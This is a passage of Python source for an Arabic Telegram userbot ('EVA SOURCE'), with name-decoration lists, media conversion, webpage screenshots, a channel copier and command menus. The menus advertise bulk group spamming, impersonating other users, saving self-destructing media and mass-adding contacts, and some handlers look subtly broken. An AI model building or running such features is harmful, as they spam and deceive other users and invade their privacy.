        "- 𝑨𝒑𝒓𝒊𝒍 ♡\n"
        "- 𝑴𝒂𝒚 𖥔\n"
        "- 𝑱𝒖𝒏𝒆 ✺\n"
        "- 𝑱𝒖𝒍𝒚 ❀\n"
        "- 𝑨𝒖𝒈𝒖𝒔𝒕 ꨄ\n"
        "- 𝑺𝒆𝒑𝒕𝒆𝒎𝒃𝒆𝒓 ☽\n"
        "- 𝑶𝒄𝒕𝒐𝒃𝒆𝒓 ✦\n"
        "- 𝑵𝒐𝒗𝒆𝒎𝒃𝒆𝒓 ❁\n"
        "- 𝑫𝒆𝒄𝒆𝒎𝒃𝒆𝒓 ⌯\n"
        "━━━━━━━━━━━━━\n"
        "✦ الأشهر الهجرية ✦\n"
        "- مُحَرَّم ⛧\n"
        "- صَفَر ❦\n"
        "- رَبِيع ٱلْأَوَّل ✥\n"
        "- رَبِيع ٱلثَّانِي ✿\n"
        "- جُمَادَى ٱلْأُولَى ☾\n"
        "- جُمَادَى ٱلثَّانِيَة ❣️\n"
        "- رَجَب 𓆩⸙𓆪\n"
        "- شَعْبَان ✿\n"
        "- رَمَضَان ⛧\n"
        "- شَوَّال ☽\n"
        "- ذُو ٱلْقَعْدَة ❁\n"
        "- ذُو ٱلْحِجَّة ✧\n"
        "━━━━━━━━━━━━━\n"
        "✦ أيام الأسبوع ✦\n"
        "- 𝓢𝓾𝓷𝓭𝓪𝔂 ✿\n"
        "- 𝓜𝓸𝓷𝓭𝓪𝔂 ⛧\n"
        "- 𝓣𝓾𝓮𝓼𝓭𝓪𝔂 ✦\n"
        "- 𝓦𝓮𝓭𝓷𝓮𝓼𝓭𝓪𝔂 ❁\n"
        "- 𝓣𝓱𝓾𝓻𝓼𝓭𝓪𝔂 ☾\n"
        "- 𝓕𝓻𝓲𝓭𝓪𝔂 ❣️\n"
        "- 𝓢𝓪𝓽𝓾𝓻𝓭𝓪𝔂 ♕"
    )

# اسماء عربية
@client.on(events.NewMessage(pattern=r"^.اسماء عربية$"))
async def اسماء_عربية(event):
    await event.edit(
        "**✦ اسماء عربية مزخرفة ✦**\n\n"
        "- مـحـمـد ♕\n"
        "- عـلـيّ ♛\n"
        "- عـمـر ✿\n"
        "- عـثـمـان ❥\n"
        "- أبـو بـكـر ♡\n"
        "- خـالـد ✧\n"
        "- سـلـمـان ⛧\n"
        "- فـاطـمـة ❀\n"
        "- عـائشـة ✺\n"
        "- زينـب ☽\n"
        "- رقـيـة ❣️\n"
        "- أم كـلثـوم ✦\n"
        "━━━━━━━━━━━━━\n"
        "- حبيبة ★\n"
        "- جنة ❁\n"
        "- ريـم ⌯\n"
        "- سجى ✿\n"
        "- سارة ⛧\n"
        "- دعاء ✥\n"
        "- شهد ✦\n"
        "- ندى ☾\n"
        "- رنا ❣️"
    )

# بنات1
@client.on(events.NewMessage(pattern=r"^.بنات1$"))
async def بنات1(event):
    await event.edit(
        "**✦ اسماء بنات مزخرفة ✦**\n\n"
        "- 𝒜𝓈𝓂𝒶𝓀 🩵\n"
        "- 𝒜𝓂𝒶𝓁 🌷\n"
        "- 𝒥𝑜𝓎𝒶 🌸\n"
        "- 𝒮𝒶𝓇𝒶 🌼\n"
        "- 𝒩𝒶𝓃𝒶 💫\n"
        "- 𝒩𝑜𝓇𝒶 ✨\n"
        "- 𝑀𝑜𝓃𝒶 🪻\n"
        "- 𝐻𝑜𝓃𝑒𝓎 💛\n"
        "- 𝐿𝒾𝓃𝒶 🩷\n"
        "- 𝐹𝒶𝓇𝒶𝒽 🕊️"
    )

# بنات2
@client.on(events.NewMessage(pattern=r"^.بنات2$"))
async def بنات2(event):
    await event.edit(
        "**✦ اسماء بنات مزخرفة إضافية ✦**\n\n"
        "- 𓆩𝐴𝓂𝓃𝒶𓆪 💕\n"
        "- 𓆩𝐻𝒾𝓃𝒶𓆪 💕\n"
        "- 𓆩𝒲𝒾𝓃𝓉𝑒𝓇𓆪 💕\n"
        "- 𓆩𝒢𝒽𝒶𝓃𝒾𝒶𓆪 💕\n"
        "- 𓆩𝒩𝒾𝓃𝒶𓆪 💕\n"
        "- 𓆩𝒵𝒾𝓃𝒶𓆪 💕\n"
        "- 𓆩𝐿𝒶𝓉𝒾𝒻𝒶𓆪 🩷\n"
        "- 𓆩𝒴𝒶𝓈𝓂𝒾𝓃𓆪 ✨\n"
        "- 𓆩𝒮𝒾𝓁𝓋𝒶𓆪 🌸"
    )

# شباب1
@client.on(events.NewMessage(pattern=r"^.شباب1$"))
async def شباب1(event):
    await event.edit(
        "**✦ اسماء شباب مزخرفة ✦**\n\n"
        "- 𓆩𝐴𝓁𝒾𓆪 🔥\n"
        "- 𓆩𝑀𝑜𝒽𝒶𝓂𝓂𝑒𝒹𓆪 🔥\n"
        "- 𓆩𝒦𝒽𝒶𝓁𝒾𝒹𓆪 🔥\n"
        "- 𓆩𝒮𝒶𝓂𝒾𓆪 🔥\n"
        "- 𓆩𝒥𝑜𝓈𝑒𝒻𓆪 🔥\n"
        "- 𓆩𝒲𝒶𝓈𝒾𝓂𓆪 🔥\n"
        "- 𓆩𝐻𝓊𝓈𝓈𝒶𝒾𝓃𓆪 🔥\n"
        "- 𓆩𝑀𝒶𝓁𝒾𝓀𓆪 ✦\n"
        "- 𓆩𝑀𝑜𝓃𝒾𝓇𓆪 ✧"
    )

# شباب2
@client.on(events.NewMessage(pattern=r"^.شباب2$"))
async def شباب2(event):
    await event.edit(
        "**✦ اسماء شباب مزخرفة إضافية ✦**\n\n"
        "- ⦅𝐀𝐇𝐌𝐀𝐃⦆ ⚡️\n"
        "- ⦅𝐑𝐀𝐌𝐘⦆ ⚡️\n"
        "- ⦅𝐌𝐀𝐉𝐃⦆ ⚡️\n"
        "- ⦅𝐌𝐀𝐍𝐒𝐎𝐔𝐑⦆ ⚡️\n"
        "- ⦅𝐀𝐘𝐌𝐀𝐍⦆ ⚡️\n"
        "- ⦅𝐇𝐀𝐒𝐇𝐈𝐌⦆ ⚡️\n"
        "- ⦅𝐁𝐀𝐒𝐄𝐄𝐌⦆ ⚡️\n"
        "- ⦅𝐒𝐇𝐀𝐇𝐄𝐄𝐑⦆ ⚡️\n"
        "- ⦅𝐓𝐀𝐑𝐄𝐊⦆ ⚡️"
    )
    

TEMP_DOWNLOAD_DIRECTORY = "./temp"
if not os.path.isdir(TEMP_DOWNLOAD_DIRECTORY):
    os.makedirs(TEMP_DOWNLOAD_DIRECTORY)

# دالة لتحويل الوسائط إلى صورة
@client.on(events.NewMessage(pattern=".حول لصوره$"))
async def to_photo(event):
    if not event.reply_to_msg_id:
        await event.edit("**⌔∮ بالـرد ﮼؏ ملصـق . . .**")
        return
    
    reply_message = await event.get_reply_message()
    filename = os.path.join(TEMP_DOWNLOAD_DIRECTORY, "converted.jpg")

    await event.edit("**⌔∮ جاري التحويل**")
    downloaded_file_name = await event.client.download_media(reply_message, filename)

    if os.path.exists(downloaded_file_name):
        await event.client.send_file(
            event.chat_id, downloaded_file_name, force_document=False, reply_to=event.reply_to_msg_id
        )
        os.remove(downloaded_file_name)
        await event.delete()
    else:
        await event.edit("**⌔∮ فشل التحويل**")

# دالة لتحويل الصور إلى ملصقات
@client.on(events.NewMessage(pattern=".حول لملصق$"))
async def to_sticker(event):
    if not event.reply_to_msg_id:
        await event.edit("**⌔∮ بالـرد ﮼؏ صـورة . . .**")
        return

    reply_message = await event.get_reply_message()
    filename = os.path.join(TEMP_DOWNLOAD_DIRECTORY, "converted.webp")

    await event.edit("**⌔∮ جاري التحويل**")
    downloaded_file_name = await event.client.download_media(reply_message, filename)

    if os.path.exists(downloaded_file_name):
        await event.client.send_file(
            event.chat_id, downloaded_file_name, force_document=False, reply_to=event.reply_to_msg_id
        )
        os.remove(downloaded_file_name)
        await event.delete()
    else:
        await event.edit("**⌔∮ فشل التحويل**")

plugin_category = "البحث"

@client.on(events.NewMessage(pattern=r"^\.ريماكس ([\s\S]*)"))
async def remaxzedthon(event):
    ok = event.pattern_match.group(1)
    if not ok:
        if event.is_reply:
            what = (await event.get_reply_message()).message
        else:
            await event.edit("`يرجى إدخال كلمة للبحث عن الريمكس..!`")
            return
    stickers = await client.inline_query("spotifybot", ok)
    await stickers[0].click(
        event.chat_id,
        reply_to=event.reply_to_msg_id,
        silent=True if event.is_reply else False,
        hide_via=True
    )
    await event.delete()

@client.on(events.NewMessage(pattern=r"^\.ريمكس ([\s\S]*)"))
async def zed(event):
    if event.fwd_from:
        return
    zedr = event.pattern_match.group(1)
    bot_username = "@spotifybot"
    
    if event.reply_to_msg_id:
        await event.get_reply_message()
    
    tap = await client.inline_query(bot_username, zedr)
    await tap[0].click(event.chat_id)
    await event.delete()
    
import traceback
plugin_category = "العروض"

@client.on(events.NewMessage(pattern=r"^(سكرين|ss) (.+)$"))
async def take_screenshot(client, event):
    "دالة لأخذ لقطة شاشة لموقع معين"
    if Config.CHROME_BIN is None:
        return await event.reply("يجب تثبيت Google Chrome. العملية توقفت.")

    mode, url_input = event.pattern_match.groups()
    zzevent = await event.reply("**- جـارِ اخـذ لقطـة شاشـه للصفحـه...**")
    start = datetime.datetime.now()

    try:
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument("--ignore-certificate-errors")
        chrome_options.add_argument("--test-type")
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.binary_location = Config.CHROME_BIN

        await event.edit("**- جـارِ الاتصـال بجـوجل كـروم ...**")
        driver = webdriver.Chrome(options=chrome_options)

        if mode == "سكرين":
            if not url_input.startswith("http"):
                url_input = f"http://{url_input}"
        elif mode == "ss":
            url_input = f"https://www.google.com/search?q={url_input}"

        driver.get(url_input)
        await event.edit("**- جـارِ رفـع لقطـة شاشـه للصفحـه...**")

        height = driver.execute_script("return document.body.scrollHeight")
        width = driver.execute_script("return document.body.scrollWidth")
        driver.set_window_size(width + 100, height + 100)
        im_png = driver.get_screenshot_as_png()

        await event.edit("**- تم إغـلاق جوجـل كـروم ✓**")
        driver.quit()

        end = datetime.datetime.now()
        ms = (end - start).seconds
        caption = f"**⎉╎المـوقع : **{url_input} \n**⎉╎ الوقت المستغـرق : {ms} ثانيـه**\n**⎉╎تم اخـذ لقطـة شاشـه .. بنجـاح ✓**"

        await zzevent.delete()
        with io.BytesIO(im_png) as out_file:
            out_file.name = "screenshot.png"
            await client.send_file(event.chat_id, out_file, caption=caption, force_document=True)

    except Exception:
        await zzevent.edit(f"`{traceback.format_exc()}`")


@client.on(events.NewMessage(pattern=r"^لقطه (.+)$"))
async def screenshot_api(client, event):
    "دالة لأخذ لقطة شاشة عبر API"
    if Config.SCREEN_SHOT_LAYER_ACCESS_KEY is None:
        return await event.edit("يجب الحصول على مفتاح API من https://screenshotlayer.com/product!")

    url_input = event.pattern_match.group(1)
    zzevent = await event.reply("**- جـارِ اخـذ لقطـة شاشـه للصفحـه...**")
    start = datetime.datetime.now()

    if not url_input.startswith("http"):
        url_input = f"http://{url_input}"

    sample_url = f"https://api.screenshotlayer.com/api/capture?access_key={Config.SCREEN_SHOT_LAYER_ACCESS_KEY}&url={url_input}&fullpage=1&viewport=2560x1440&format=PNG&force=1"
    response_api = requests.get(sample_url)

    end = datetime.datetime.now()
    ms = (end - start).seconds
    caption = f"**⎉╎المـوقع : **{url_input} \n**⎉╎ الوقت المستغـرق : {ms} ثانيـه**\n**⎉╎تم اخـذ لقطـة شاشـه .. بنجـاح ✓**"

    if "image" in response_api.headers["content-type"]:
        with io.BytesIO(response_api.content) as screenshot_image:
            screenshot_image.name = "screencapture.png"
            await client.send_file(event.chat_id, screenshot_image, caption=caption, force_document=True)
            await zzevent.delete()
    else:
        await zzevent.edit(f"`{response_api.text}`")

@client.on(events.NewMessage(outgoing=True, pattern=r"^نسخ (.+)"))
async def copy_channel_messages(event):
    try:
        # استخراج يوزر القناة
        channel_username = event.pattern_match.group(1)

        # جلب المنشورات من القناة وإرسالها إلى نفس المحادثة
        async for post in client.iter_messages(channel_username, limit=50):  # ينسخ آخر 50 منشور فقط
            if post.text:
                await event.respond(post.text)
            elif post.photo:
                await event.respond(file=post.photo, message=post.text or "")
            elif post.video:
                await event.respond(file=post.video, message=post.text or "")
            elif post.document:
                await event.respond(file=post.document, message=post.text or "")

        await event.respond("**⎙ تم نسخ المنشورات بنجاح!**")
    except Exception as e:
        await event.respond(f"❌ **حدث خطأ:** `{str(e)}`")

@client.on(events.NewMessage(from_users='me', pattern='.الاوامر'))
async def show_commands(event):
    commands_text = """ 
⋆ـ┄──┄─𝗘𝗩𝗔 𝗦𝗢𝗨𝗥𝗖𝗘┄─┄─┄┄ـ
`.م1`➪  اوامــر الــخــاص
`.م2`➪  اوامــر الــردود
`.م3`➪  اوامــر نــشــر الــتـلـقـائـي
`.م4`➪  اوامــر الــحــســاب
`.م5`➪  اوامــر الــتــسـلـيــة
`.م6`➪  اوامــر وعــد
`.م7`➪  اوامــر الــيــوتــيــوب 
`.م8`➪ اوامــر الــمــجــمــوعـات
`.م9`➪ اوامـر تجــمــيــع تـلـقـائـي 
`.م10`➪ اوامــر الـخطـوط والترجمة 
`.م11`➪ اوامر التنصيب الخارجي 
`.م12`➪ اوامــر الــمــغـادرات
`.م13`➪ اوامــر الـذاتيــة
`.م14`➪ اوامــر الاضـافـة
`.م15`➪ اوامــر الـتـحـويـل
`.م16`➪ اوامــر اخـرى
`.م17`➪ اوامــر الـذكــاء الاصـطـنـاعـي
`.م18`➪ اوامــر عرض القنوات 
`.م19`➪ اوامــر الـزخـرفـة
`.م20`➪ اوامــر اضـافـيـة
`.م21`➪ اوامــر 2 الـتـسـلـيـه
`.م22`➪ اوامــر الـمـيـمـز
`.م23`➪ اوامــر الـتـقـلـيـد والـنـتـحـال
`.م24`➪ اوامــر الـتـحــشــيــش
`.م25`➪ اوامــر صـيـد الـيـوزرات
`.م26`➪ اوامــر الـتـثـبـيـت
"""
    await event.edit(commands_text)

@client.on(events.NewMessage(from_users='me', pattern='.م1'))
async def show_m1_commands(event):
    m1_text = """
<━━━[★] اوامر الخاص [★]━━━>
 • `.كتم`
▪︎ يقوم بكتم الشخص في الخاص

 • `.سماح`
▪︎ يقوم بي الغاء الكتم من الخاص 

 • `.المكتومين`
▪︎ يقوم بإظهار عدد المكتومين في الخاص 

 • `.اضافة قناة اشتراك (رابط القناة)`
▪︎ يقوم بوضع قناه لا احد يستطيع مراسلتك الى بعد الاشتراك فيها 

 • `.مسح القناة`
▪︎ يقوم بمسح قناه الاشتراك من الخاص 

 • `.حماية الخاص`
▪︎ يحمي الخاص من اي كلامات مسئه

 • `.تحذير`
▪︎ يقوم بي عدد التحذيرات مثال تحذير + عدد التحذيرات 

 • `.قبول` 
▪︎ يقوم برد على الشخص بل خاص ولا يقوم بإعطائه تحذيرات

 • `.الغاء القبول`
▪︎ يقوم بي الغاء القبول وإعطائه تحذيرات 

 • `.تعيين كليشة التحذير`
▪︎ يقوم بتغير كليشه التحذير 
 
 • `.عرض كليشة`
▪︎ يقوم يعرض كليشه التحذير التي تستخدمها 
 
 • `.مسح المحظورين`
▪︎ يقوم بمسح المحظورين الذين تم حظرهم بسبب التكرار في الخاص
 
 • `. مسح التحذيرات`
▪︎ يقوم بمسح جميع تحذيرات للشخص برد عليه
"""
    await event.edit(m1_text)

@client.on(events.NewMessage(from_users='me', pattern='.م2'))
async def show_m2_commands(event):
    m2_text = """
<━━━[★] اوامر الردود [★]━━━>
 • ـ`.add (الكلمة المفتاحية) الرد`
 • مثال لاضافه الرد الخاص مع الصوره

 • `.الكلمة المفتاحية`

 • `.الردود`

 • `.رد (النص)`
 • مثال لتعين الرد التلقائي للخاص
"""
    await event.edit(m2_text)

@client.on(events.NewMessage(from_users='me', pattern='.م3'))
async def show_m3_commands(event):
    m3_text = """
<━━━[★] النشر التلقائي  [★]━━━>
 • `.تك`  (عدد الثواني) (عدد مرات النشر) الرسالة'

 • `.تكرار`  (عدد الثواني) (عدد مرات النشر) الرسالة'

 • `.نشر` (عدد الثواني) (عدد مرات النشر) الرسالة'

 • `.ايقاف النشر التلقائي` 

 • `.نشر مجموعات (عدد المجموعات)` الرسالة

 • `.خاص ` اذاعة للخاص

 • `.سوبر` عدد الثواني :
▪︎ للنشر بكافة المجموعات السوبر التي منظم اليها 

 • `تناوب` عدد الثواني : 
▪︎ للنشر في جميع المجموعات بالتناوب وحسب الوقت المحدد 

 • `.بلش` +ثواني : لتكرار الرسالة
▪︎ مثال روح الكروب الي تريد تنشر بيه واكتب هاي

"""
    await event.edit(m3_text)

@client.on(events.NewMessage(from_users='me', pattern='.م4'))
async def show_m4_commands(event):
    m4_text = """
<━━━[★] اوامر الحساب [★]━━━>
 • `.تفعيل الاسم الوقتي` 
▪︎ يقوم بتفعيل وقت يم اسمك

 • `.تعطيل الاسم الوقتي`
▪︎ يقوم بتعطيل وقت يم اسمك

 • `.عداد (عدد الدقائق)`
▪︎ يقوم بإنشاء عداد تنازلي

 • `.توقيف`
▪︎ يقوم بتوقيف العداد

 • `.الاسم (الاسم الجديد)`
▪︎ يقوم بتغير اسمك دون حاجه للتعب 

 • `.مسح (عدد الرسائل)`
▪︎ يقوم بمسح رسائلك 

 • `الاشكال`
▪︎ يقوم بعرض اشكال الوقتي

 • `.احصائياتي`
▪︎ يقوم بعرض عدد قنواتك وعدد كروباتك

 • `.معلوماتي` 
▪︎ يقوم بعرض جميع قنواتك وكروبات وعدد الخاص
"""
    await event.edit(m4_text)

@client.on(events.NewMessage(from_users='me', pattern='.م5'))
async def show_m5_commands(event):
    await event.delete()
    m5_text = """
╮•❐ اوامـر التسليـه والكاريكتـر  ⦂ 
 • `.متت` • `.انتحار` • `.شرير` • `.غبي` • `.ترحيب` • `.وحش` • `.قاتل` • `.مسدس` • `.كلب` • `.هلو` • `.ثعبان` • `.دس لايك` • `.اشارة` • `.شرطة` • `.احم` • `.احبك` • `.ثلج` • `.السورس` • `.حب` • `.سبونج بوب` • `.طائره` • `.صدمه` • `.نادم`  • `.قنبلة` • `.تهكير` • `.اختراق`

"""
    await event.reply(m5_text)

@client.on(events.NewMessage(from_users='me', pattern='.م6'))
async def show_m6_commands(event):
    m6_text = """
<━━━[★] اوامر بوت وعد [★]━━━>
 • `.راتب`
▪︎ يقوم بتجميع فلوس بوت وعد

 • `.ايقاف راتب`
▪︎ يقوم بإيقاف تجميع فلوس وعد

 • `.بخشيش`
▪︎ يقوم باخذ بخشيش من بوت وعد

 • `.ايقاف بخشيش`
▪︎ يقوم ايقاف اخذ بخشيش من بوت وعد

 • `.سرقة (ايدي شخص)`
▪︎ يقوم بسرقه الشخص من فلوس وعد 

 • `.ايقاف سرقة`
▪︎ يقوم بإيقاف سرقه الشحص من بوت وعد

```▪︎ ملاحظة الاوامر تنطبق على جميع البوت المشابهه لبوت وعد```
"""
    await event.edit(m6_text)

@client.on(events.NewMessage(from_users='me', pattern='.م7'))
async def show_m7_commands(event):
    m7_text = """
<━━━[★] اوامر تحميل [★]━━━>
 • `.يوتيوب (عنوان الفيديو)`
▪︎ يقوم بتحميل من يوتيوب 

 • `.تحميل + رابط الفيديو`
▪︎ يقوم بتحميل الفيديوهات من جميع التواصل الاجتماعي 

• `.يوت + اسم الاغنيه`
▪︎ يقوم بل بحث عن الأغنية وأرسلها 
"""
    await event.edit(m7_text)
    
@client.on(events.NewMessage(from_users='me', pattern='.م8'))
async def show_m8_commands(event):
    m8_text = """
<━━━[★] اوامر المجموعه [★]━━━>

 • `.تقييد | بالرد`
▪ ︎يقوم بتقيد الشخص من المجموعة

 • `.الغاء تقييد | بالرد`
▪ ︎يقوم بفك التقيد من الشخص 

 • `.المقيدين`
 ▪ ︎ يعرض لك عدد الأشخاص المقيدين 
 
 • `.كشف المجموعة`
▪ ︎ يعرض لك معلومات عن الكروب

 • `.تفعيل هنا`
▪ ︎قم برد في داخل الكروب لكي يتم تشغيل الردود في الكروب 

 • `.تعطيل هنا`
▪ ︎اذا قمت بل الارسال في داخل الكروب تفعيل هنا يمكنك تعطيلها اذا لم تفعل قلا تكتب شي 

 • `.اضف رد`
▪ ︎مثال اضف رد + السلام عليكم + وعليكم السلام عندما شخص يكتب السلام عليكم يرد بعليكم السلام 

"""
    await event.edit(m8_text)

@client.on(events.NewMessage(from_users='me', pattern='.م9'))
async def show_m9_commands(event):
    m9_text = """
<━━━[★] اوامر التجميع [★]━━━>
• `.تجميع المليار`
• `.تجميع الجوكر`
• `.تجميع العقاب`
• `.تجميع العقرب`
• `.تجميع العرب`
• `.تجميع دعمكم`
• `.تجميع كرستيانو`
• `.تجميع مهدويون`
• `.تجميع اساسيل`

• .ايقاف التجميع  - لايقاف حالة التجميع 
```مـلاحظة : يجب الاشتراك في قنوات البوت الاجبارية قبل بدء التجميع . ```
"""    
    await event.edit(m9_text)

@client.on(events.NewMessage(from_users='me', pattern='.م10'))
async def show_m10_commands(event):
    m10_text = """
<━━━[★] اوامر الخطوط [★]━━━>
⎙ `خط غامق`   ⎙ `خط مشطوب`

⎙ `خط رمز`   ⎙ `خط بايثون`

5- `.طباعة` + الكلمة او الجملة المراد ارسالها

جميع الخطوط اعلاه تتوقف بكتابة نفس امر التشغيل 

 • ︎`.مترجم` + رمز اللغة | مثال .مترجم ar

▪︎ يقوم هذا الامر بعد تفعيله بتحويل اي جمله الى اللغة المحدده

▪ ︎`.ايقاف المترجم` لايقاف الخدمة
"""
    await event.edit(m10_text)

@client.on(events.NewMessage(from_users='me', pattern='.م11'))
async def show_m11_commands(event):
    m11_text = """
<━━━[★] اوامر التنصيب [★]━━━>

متوقفه في هذا التحديث 

"""
    await event.edit(m11_text)


@client.on(events.NewMessage(from_users='me', pattern='.م12'))
async def show_m12_commands(event):
    m12_text = """
<━━━[★] اوامر المغادرة [★]━━━>
 • `.مغادرة القنوات'`
▪︎ لمغادرة جميع القنوات التي تمتلكها باستثناء القنوات التي انت مالكها او مشرف فيها 

 • `.مغادرة الكروبات`
▪︎ لمغادرة جميع المجموعات باستثناء المجموعات التي انت مالكها او مشرف فيها 
"""
    await event.edit(m12_text)

@client.on(events.NewMessage(from_users='me', pattern='.م13'))
async def show_m13_commands(event):
    m13_text = """
<━━━[★] اوامر الذاتيه [★]━━━>
      `.ذاتية`
▪︎ يستخدم لحفظ الصور والفيديوهات المؤقتة (بالرد على الصورة).

      `.حفظ الذاتية`
▪︎ سيقوم هذا الامر بعد تفعيلة بحفظ الصور والفيديوهات المؤقته تلقائيا .
"""    
    await event.edit(m13_text)

@client.on(events.NewMessage(from_users='me', pattern='.م14'))
async def show_m14_commands(event):
    m14_text = """
<━━━[★] اوامر الاظافة [★]━━━>
        `.ضيف`
▪︎ يقوم بإضافه الاعضاء الي كروبك او قناتك 

        `اضافة_جهاتي`
▪︎ يقوم بإضافة جهات الاتصال الخاصه بك وبسرعه فايقه

``` تنبيه لا تلح بل الامر كثر راح تنحظر ```
"""
    await event.edit(m14_text)

@client.on(events.NewMessage(from_users='me', pattern='.م15'))
async def show_m15_commands(event):
    m15_text = """
<━━━[★] اوامر التحويل [★]━━━>
 • `.تحويل نص `
▪︎ يقوم بتحويل النص الي ملصق

 • `.حول لملصق`
▪︎ يحول الصوره الى ملصق مثال = .حول لملصق برد على الصورة

 • `.حول لصوره`
▪︎ يحول الملصق الى صورة مثال = .حول لصوره برد على الملصق 
"""    
    await event.edit(m15_text)

@client.on(events.NewMessage(from_users='me', pattern='.م16'))
async def show_m16_commands(event):
    m16_text = """
<━━━[★] اوامر أخرى [★]━━━>
 • `.تاريخه`
▪︎ يظهر لك تاريخ أنشأء الحساب

 • `.ايميل وهمي`
▪︎ يقوم بعمل ايميل وهمي (موقت)

 •︎ `.حالتي`
▪︎ يقوم بإظهار ان كنت محظور ام لا 

 •︎ `.مود التكبر`
▪︎ مثال اكتب التكبر : العدد

 •︎ `.مود التكبر تعطيل`
▪︎ يقوم بتعطيل امر التكبر 

 •︎ `.التكبر تعطيل`
▪︎ يقوم بتعطيل امر التكبر 

 • `.اختصار
▪︎ يستخدم بالرد على اي رسالة يقوم بوضع اختصار للجملة التي رددت عليها بالامر .

 •︎ `.الاختصارات`
▪︎ يعرض لك الاختصارات المضافه 

 •︎ `.حذف اختصار`
▪︎ يحذف الاختصار مثال = حذف + الكلمه 
"""
    await event.edit(m16_text)

@client.on(events.NewMessage(from_users='me', pattern='.م17'))
async def show_m17_commands(event):
    m17_text = """
<━━━[★] اوامر الذكاء الاصطناعي [★]━━━>
		`.ذكاء`
▪︎ مثال اكتب .ذكاء : السؤال

		`.الذكاء تفعيل`
▪︎ يقوم بتشغيل الذكاء الاصطناعي في حسابك 

		`.الذكاء تعطيل`
▪︎ يقوم بإيقاف الذكاء الاصطناعي في الحساب 
"""    
    await event.edit(m17_text)

@client.on(events.NewMessage(from_users='me', pattern='.م18'))
async def show_m18_commands(event):
    m18_text = """
<━━━[★] اوامر القنوات [★]━━━>
 •︎ `.قائمه قنواتي`
▪︎ يقوم بي اظهار جميع قنواتك 

 •︎ `.قائمه كروباتي`
▪︎ يقوم بإظهار جميع كروباتك
"""
    await event.edit(m18_text)

@client.on(events.NewMessage(from_users='me', pattern='.م19'))
async def show_m19_commands(event):
    m19_text = """
<━━━[★] اوامر الزخرف [★]━━━>
 • `.شباب1`
▪︎ بعطيك زخارف شباب 1

 • `.شباب2`
▪︎ بعطيك زخارف شباب 2
 
 • `.بنات1`
▪︎ بعطيك زخارف بنات 1
 
 • `.بنات2`
▪︎ بعطيك زخارف بنات 2
 
 • `.اسماء عربية`
▪︎ بعطيك زخارف اسماء عربية

 • `.اشهر مزغرف`
▪︎ بعطيك زخارف اسماء الأشهر مزخرفه 

"""    
    await event.edit(m19_text)
    
@client.on(events.NewMessage(from_users='me', pattern='.م20'))
async def show_m20_commands(event):
    m20_text = """
<━━━[★] اوامر اضافيه[★]━━━>
 • `كتابة `+ عدد الثواني 
 = لأضهار كلمة يكتب .. بشكل وهمي

 • `فيد` + عدد الثواني 
 = لأظهار بأنك ترسل فيديو في المجموعة او الخاص

 • `لعبة` + عدد الثواني 
 = لإظهار بأنك تلعب 

 • `صوتية` + عدد الثواني 
 = لأظهار بأنك تسجل بصمة
"""    
    await event.edit(m20_text)    

@client.on(events.NewMessage(from_users='me', pattern='.م21'))
async def show_m21_commands(event):
    m21_text = """
<━━━[★] اوامر 2 التسليه [★]━━━>
 • `.بنج`
▪︎ يعرض لك سرعه نتك 

 • `.انمي`
▪︎ يقوم بي انشاء صور الانمي 

 • `.بلي`
▪︎ عباره عن العاب 

 • `.كت`
▪︎ يقوم بي اعطاك اسالة 

 • `.عكس`
▪︎ يقوم بعكس الكلام برد على الكلام

 • `.خيروك`
▪︎ يقوم بإعطاء خيارات اساله 

 • `.اكس او`
▪︎ يقوم بعرض لعبه XO

 • `.كرة`
▪︎ يقوم بعرض لعبه الكرة 

 • `.سله`
▪︎ يقوم بعرض لعبه السله

 • `.نرد`
▪︎ يقوم بعرض لعبه النرد

 • `.حظ`
▪︎ يقوم بعرض لعبه الحظ

 • `.سهم`
▪︎ يقوم بعرض لعبه السهم
"""    
    await event.edit(m21_text)    

@client.on(events.NewMessage(from_users='me', pattern='.م22'))
async def show_m22_commands(event):
    m22_text = """
<━━━[★] اوامر البصمات [★]━━━>
• ︎البصمة : `.غنيلي`. ︎ 
• ︎البصمة : `.شعر`   ︎  
• ︎البصمة : `.قران`.   
• ︎البصمة : `.زيج حزين`
• ︎البصمة : `.يعني هل خره`
• ︎البصمة : `.لوكي شدخلك`
• ︎البصمة : `.الى متى`
• ︎البصمة : `.احط رجلي`
• ︎البصمة : `.تبا`
• ︎البصمة : `.اكل خرا`
"""    
    await event.edit(m22_text)    

@client.on(events.NewMessage(from_users='me', pattern='.م23'))
async def show_m23_commands(event):
    m23_text = """
<━━━[★] اوامر التقليد والانتحال [★]━━━>
 • `.تفعيل التخزين`
▪︎ يقوم بإنشاء كروب وتخزين رسائل الخاص والمجموعات 

 • `.انتحال | بالرد على رسالة`
▪︎ يقوم بانتحال الشخص

 • `.ارجاع`
▪︎ يرجع حسايك لوضع الطبيعي 

 • `.تقليد | بالرد`
▪︎ يقوم بتقيد رسائل الشخص 

 • `.ايقاف التقليد`
▪︎ يقوم بإيقاف تقليد الشخص
"""    
    await event.edit(m23_text)    

@client.on(events.NewMessage(from_users='me', pattern='.م24'))
async def show_m24_commands(event):
    m24_text = """
<━━━[★] اوامر التحشيش [★]━━━>
 • `.رفع مرتي`
 • `.رفع جلب`
 • `.زواج`
 • `.طلاك`

 • `.︎نسبة + اي كلمة`
▪︎ بالرد على الشخص 

 • `.نسبتنا + اي كلمة`

 • `.︎بوسة | .هينة`
▪︎ بالرد برد على الشخص 

 • `رفع + اي كلمة`

 • `.مقارنة`
▪︎ بالرد برد على الشخص 
"""    
    await event.edit(m24_text)    

@client.on(events.NewMessage(from_users='me', pattern='.م25'))
async def show_m25_commands(event):
    m25_text = """
<━━━[★] اوامر صيد يوزرات [★]━━━>
 • `.صيد + النـوع`
⪼ لـ صيـد يـوزرات عشوائيـه على حسب النـوع

 • `.حالة الصيد`
⪼ لـ معرفـة حالـة تقـدم عمليـة الصيـد

 • `.صيد ايقاف`
⪼ لـ إيقـاف عمليـة الصيـد الجاريـه

 • `.نوع`
⪼ لـ عـرض الانـوع التي يمكـن صيدهـا مع الامثـله
"""    
    await event.edit(m25_text)    

@client.on(events.NewMessage(from_users='me', pattern='.م26'))
async def show_m26_commands(event):
    m26_text = """
<━━━[★] اوامر التثبيت [★]━━━>
⎙ • `.تثبيت لستة`

يستخدم الامر بالرد على يوزر واحد او عدة يوزرات 
لفحص اليوزرات التي حددتها فقط سياخذها في حال اصبحت متاحة 

⎙ • `.حالة التثبيت  | .ايقاف التثبيت`  
